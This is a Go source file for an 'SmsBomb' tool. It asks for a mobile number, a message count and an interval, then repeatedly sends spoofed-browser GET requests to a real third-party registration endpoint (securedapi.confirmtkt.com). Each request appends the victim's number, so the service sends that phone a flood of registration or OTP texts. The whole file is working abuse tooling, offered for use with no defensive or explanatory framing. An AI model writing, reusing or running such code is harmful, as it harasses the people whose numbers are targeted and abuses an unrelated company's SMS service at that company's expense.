package core

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}

	cmd.Stdout = os.Stdout
	cmd.Run()
}

func start(num string, counter, slep int) {
	url := "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
	hdr := http.Header{
		"User-Agent": []string{
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
		},
		"Accept": []string{
			"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		},
		"Accept-Charset":  []string{"ISO-8859-1,utf-8;q=0.7,*;q=0.3"},
		"Accept-Encoding": []string{"none"},
		"Accept-Language": []string{"en-US,en;q=0.8"},
		"Connection":      []string{"keep-alive"},
	}
	resultURL := url + num
	client := http.Client{}
	req, err := http.NewRequest("GET", resultURL, nil)
	if err != nil {
		fmt.Println("[ERROR] ", err)
		return
	}
	req.Header = hdr
	for x := 0; x < counter; x++ {
		clearScreen()
		page, err := client.Do(req)
		if err != nil {
			fmt.Println("[ERROR] ", err)
			return
		}
		defer page.Body.Close()
		time.Sleep(time.Duration(slep) * time.Second)
	}
}

func SmsBomb() {
	var number, count, throttle string

	fmt.Print("enter mobile_number: ")
	fmt.Scan(&number)
	fmt.Print("enter number of messages: ")
	fmt.Scan(&count)
	fmt.Print("enter interval (seconds): ")
	fmt.Scan(&throttle)

	countInt, err := strconv.Atoi(count)
	if err != nil {
		fmt.Println("[ERROR] invalid number of messages: ", err)
		return
	}

	throttleInt, err := strconv.Atoi(throttle)
	if err != nil {
		fmt.Println("[ERROR] invalid interval: ", err)
		return
	}

	start(number, countInt, throttleInt)
}
